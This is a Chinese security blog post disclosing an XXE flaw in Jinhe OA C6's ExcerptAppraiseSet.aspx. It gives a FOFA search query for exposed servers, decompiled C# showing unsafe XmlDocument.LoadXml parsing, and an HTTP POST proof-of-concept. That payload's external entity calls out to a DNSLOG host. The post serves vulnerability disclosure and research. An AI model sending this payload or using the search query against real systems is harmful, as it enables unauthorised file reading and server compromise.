---
title: "金和OA ExcerptAppraiseSet.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html
asset_dir: assets/金和oa-excerptappraiseset.aspx-xxe漏洞
---

# 金和OA ExcerptAppraiseSet.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/24 13:30
* 448浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

防火墙软件

安全研究报告

SQL注入检测工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ExcerptAppraiseSet.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE "XXE")漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ExcerptAppraiseSet.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **ExcerptAppraiseSet** 的处理逻辑

```
  protected void Page_Load(object sender, EventArgs e)
  {
    this.InitText();
    this.Request.QueryString.ToString();
    string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")漏洞。

深入探索

Web安全课程

网络安全会议

代码安全审计

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/ExcerptAppraiseSet.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA ExcerptAppraiseSet.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA ExcerptAppraiseSet.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全工具开发

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ExcerptAppraiseSet-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 